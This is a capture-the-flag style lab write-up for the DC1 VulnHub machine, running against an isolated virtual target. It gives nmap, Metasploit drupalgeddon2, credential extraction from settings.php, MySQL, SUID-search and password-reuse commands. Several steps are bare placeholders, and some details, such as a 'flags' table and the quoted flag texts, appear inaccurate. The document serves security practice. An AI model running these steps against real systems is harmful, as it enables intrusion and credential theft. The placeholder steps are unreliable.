Home Hacking Lab: DC1 VulnHub Machine Exploitation
Description:
This section of the home hacking lab project focuses on downloading and exploiting the DC1 VulnHub machine. The primary objective is to practice and enhance cybersecurity skills through hands-on exercises in vulnerability scanning, exploitation, and post-exploitation techniques, culminating in the capture of multiple flags.

Apps, Languages, & Utilities Used:

Virtualization Software: VirtualBox
Operating Systems: Kali Linux, DC1 VulnHub machine
Security Tools: Metasploit, nmap, Hydra, LinPEAS, MySQL
Scripting: Bash
Environments Used:

Kali Linux: Attacker Machine
DC1 VulnHub Machine: Vulnerable VM
Objective:
The objective is to exploit the DC1 VulnHub machine by identifying and capturing flags, thereby gaining practical experience in cybersecurity concepts, tools, and techniques.

Skills Learned:

Setting up VMs in Oracle VM VirtualBox.
Performing vulnerability scanning using nmap.
Exploiting web application vulnerabilities using Metasploit.
Brute-forcing login credentials using Hydra.
Capturing and analyzing database credentials.
Performing privilege escalation and capturing flags on a vulnerable machine.
Documenting and reporting exploitation techniques.
Steps Taken:

Download and Setup DC1 VulnHub Machine
Download DC1 Machine from VulnHub:

Navigate to VulnHub and search for DC1 or go directly to the DC1 VulnHub page.
Download the DC1 machine and extract the contents.
Import the DC1 Machine into VirtualBox:

Open VirtualBox and go to File > Import Appliance.
Select the extracted DC1 file and follow the prompts to complete the import.
Configure Network Settings:

Adjust the network adapter to NAT Network and select the appropriate network.
Start the DC1 VM:

Boot up the DC1 VM and ensure it is running properly.
Exploitation of DC1 VulnHub Machine
Flag 1: Initial Enumeration and Exploitation
Objective: Identify and capture the first flag by exploiting the web application.

Verify DC1 Machine is Running:

Ensure the DC1 machine is up and running by pinging its IP address:
bash
Copy code
ping 10.0.200.6
Information Gathering:

Perform an nmap scan to identify open ports and services:
bash
Copy code
nmap -A -sC -oN dc.txt 10.0.200.6
Enumerate the Web Application:

Access the web application running on port 80 and identify that it is using Drupal.
Use Metasploit to find and exploit vulnerabilities in Drupal:
bash
Copy code
msfconsole
search drupal
use exploit/unix/webapp/drupal_drupalgeddon2
set RHOSTS 10.0.200.6
run
Capture Initial Flag:

Once you gain a shell, navigate the file system to find the first flag:
bash
Copy code
find / -name flag1.txt
cat /path/to/flag1.txt
Flag 1 Content: "Every good CMS needs a config file."
Flag 2: Database Enumeration and Exploitation
Objective: Identify and capture the second flag by exploiting the database.

Identify Configuration Files:

Use the hint from Flag 1 to locate the Drupal configuration file:
bash
Copy code
cat /var/www/html/sites/default/settings.php
Find Database Credentials:

Extract database credentials from the configuration file.
Connect to the Database:

Use the credentials to connect to the MySQL database:
bash
Copy code
mysql -u dbuser -p
Enumerate Database and Capture Flag:

Enumerate the database to find the second flag:
bash
Copy code
show databases;
use drupal;
show tables;
select * from flags;
Flag 2 Content: "Brute force and directory attacks aren't the only way to gain access."
Flag 3: Privilege Escalation and System Enumeration
Objective: Identify and capture the third flag by performing privilege escalation.

Identify Weak Configurations:

Search for files with weak permissions or misconfigurations that could allow privilege escalation:
bash
Copy code
find / -perm -4000 -type f 2>/dev/null
Exploit Weakness:

Use tools like GTFOBins to escalate privileges:
bash
Copy code
/path/to/vulnerable_binary
Capture Third Flag:

Once privileges are escalated, navigate the file system to find the third flag:
bash
Copy code
find / -name flag3.txt
cat /path/to/flag3.txt
Flag 3 Content: "There's more than one way to skin a cat."
Flag 4: User Enumeration and Exploitation
Objective: Identify and capture the fourth flag by exploiting user credentials.

Enumerate Users:

List all users on the system and look for interesting files in their home directories:
bash
Copy code
cat /etc/passwd
ls /home
Check for Reused Passwords:

Try using previously discovered passwords to switch to different users:
bash
Copy code
su - username
Capture Fourth Flag:

Navigate the user's home directory to find the fourth flag:
bash
Copy code
find /home -name flag4.txt
cat /path/to/flag4.txt
Flag 4 Content: "You can use the same method to find or access the root flag."
Final Flag: Root Privilege Escalation
Objective: Identify and capture the final flag by gaining root access.

Identify Privilege Escalation Vector:

Look for misconfigurations or software vulnerabilities that allow root access.
Use tools like LinPEAS or manual enumeration to identify vectors.
Exploit and Gain Root Access:

Perform the privilege escalation to gain root access:
bash
Copy code
/path/to/exploit
Capture Final Flag:

Navigate to the root directory and find the final flag:
bash
Copy code
cd /root
cat final_flag.txt
Final Flag Content: "Well done! You have completed the DC1 challenge."
